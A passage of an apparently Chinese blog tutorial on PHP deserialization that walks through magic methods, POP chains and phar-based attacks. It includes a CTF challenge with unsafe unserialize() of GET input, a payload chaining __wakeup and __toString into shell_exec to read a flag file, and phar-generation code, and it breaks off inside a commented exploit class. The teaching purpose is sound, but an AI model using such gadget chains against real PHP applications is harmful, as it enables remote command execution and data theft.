class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/get.png" class="" title="get">

<p>$name存储不可访问或不存在的属性名：即把ilyy4替换为Arach一样可以触发，同样的$name必须存在</p>
<h3 id="isset-："><a href="#isset-：" class="headerlink" title="__isset()："></a>__isset()：</h3><p> 当对一个对象的不存在或不可访问的属性使用 isset() 或 empty() 函数时自动调用，传递属性名作为参数。</p>
<p>或者说检测对象的某个属性是否存在时执行此函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Are you sure there is &quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$ZL47yY</span>-&gt;illy4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/isset.png" class="" title="isset">

<p>与__get()一样，$name也是必不可少，把illy4替换为Arach、Chesmond或者把isset替换为empty都会触发</p>
<h3 id="unset-："><a href="#unset-：" class="headerlink" title="__unset()："></a>__unset()：</h3><p>当对一个对象的不存在或不可访问的属性使用 unset() 函数时自动调用，传递属性名作为参数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unset一个不可访问的属性或者不存在的属性</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Unset &quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$ZL47yY</span>-&gt;Chesmond);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$ZL47yY</span>-&gt;illy4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/unset.png" class="" title="unset">

<p>但是由于Chesmond的protected属性，最终无法真正被销毁，但是public就不一样了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;ZLARYY&quot;:2:&#123;s:11:&quot;*Chesmond&quot;;s:5:&quot;L47yY&quot;;s:13:&quot;ZLARYYArach&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/unset2.png" class="" title="unset2">

<p>可以看到也只触发了一次__unset()</p>
<h3 id="clone-："><a href="#clone-：" class="headerlink" title="__clone()："></a>__clone()：</h3><p> 当使用 clone 关键字复制一个对象时自动调用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$illy4</span> = <span class="keyword">clone</span> <span class="variable">$ZL47yY</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$illy4</span>));</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/clone.png" class="" title="clone">

<p>能触发并且成功clone</p>
<h3 id="debugInfo-："><a href="#debugInfo-：" class="headerlink" title="__debugInfo()："></a>__debugInfo()：</h3><p>在使用 var_dump() 打印对象时自动调用，用于自定义对象的调试信息。</p>
<p><strong>注：这个魔术方法在5.6.0被引进</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__debugInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/dubuginfo.png" class="" title="dubuginfo">

<p>同时我们可以利用这个魔术方法自定义返回的数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__debugInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;xiexie&#x27;</span> =&gt; <span class="string">&quot;CTFer&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Chesmond&#x27;</span> =&gt; <span class="variable language_">$this</span>-&gt;Chesmond</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/debuginfo.png" class="" title="debuginfo">

<h3 id="set-state-："><a href="#set-state-：" class="headerlink" title="__set_state()："></a>__set_state()：</h3><p> 在使用 var_export() 导出类时自动调用，用于返回一个包含类的静态成员的数组。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__set_state</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">var_export</span>(<span class="variable">$ZL47yY</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/setstatic.png" class="" title="setstatic">

<p>调用这个魔术方法不仅仅只var_export一个对象，还需要将生成的内容拿去执行，也就是eval($code,’;’)部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_export() 不会 执行 __set_state() 方法。 它只是生成了一段代码字符串，这段代码里包含了对 __set_state() 的调用。</span><br><span class="line">只有当你把这段生成的代码拿去 执行（例如使用 eval() 或者写入文件后 include）时，__set_state() 才会被真正触发。</span><br></pre></td></tr></table></figure>

<h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><p><strong>POP链</strong>（Property-Oriented Programming Chain）是一种通过控制对象属性来构造的调用链，利用一系列魔术方法之间的调用关系，最终达到执行任意代码的目的。</p>
<p>这里采用几道例题来展示：</p>
<h3 id="POLARD-N简单上的php反序列化初试："><a href="#POLARD-N简单上的php反序列化初试：" class="headerlink" title="POLARD&amp;N简单上的php反序列化初试："></a>POLARD&amp;N简单上的php反序列化初试：</h3><p>题目内容：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$env</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;env=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$this</span>-&gt;evil);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;env;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;easy&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;easy&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题很明显在第一个类Easy中有个echo语句可以触发第二个类Evil的toString方法，利用echo把对象Evil当做字符串执行，进而触发shell_exec</p>
<p>payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span>=<span class="string">&#x27;sort fl@g.php;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$env</span>=<span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;env=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$this</span>-&gt;evil);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;env;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/30.png" class="" width="30">

<p>这道题我们可以直接修改env属性为public直接传入 </p>
<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展php反序列化漏洞的攻击面</p>
<p>phar文件结构 ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.a stub</span><br><span class="line">    可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件</span><br><span class="line">2.a manifest describing the contents</span><br><span class="line">	phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方</span><br><span class="line">3.the file contents</span><br><span class="line">被压缩文件的内容</span><br><span class="line">4.[optional] a signature for verifying Phar integrity (phar file format only)</span><br><span class="line">	签名，放在文件末尾</span><br></pre></td></tr></table></figure>

<p>phar文件生成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里给一下其他脚本大佬的注释 ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 定义核心恶意类：funny</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span></span>&#123;</span><br><span class="line">    <span class="comment">// __destruct()是PHP魔术方法：当对象被销毁（如脚本结束、unset、反序列化后）时自动执行</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// global $flag：声明使用全局变量$flag（目标服务器中通常存储flag）</span></span><br><span class="line">        <span class="keyword">global</span> <span 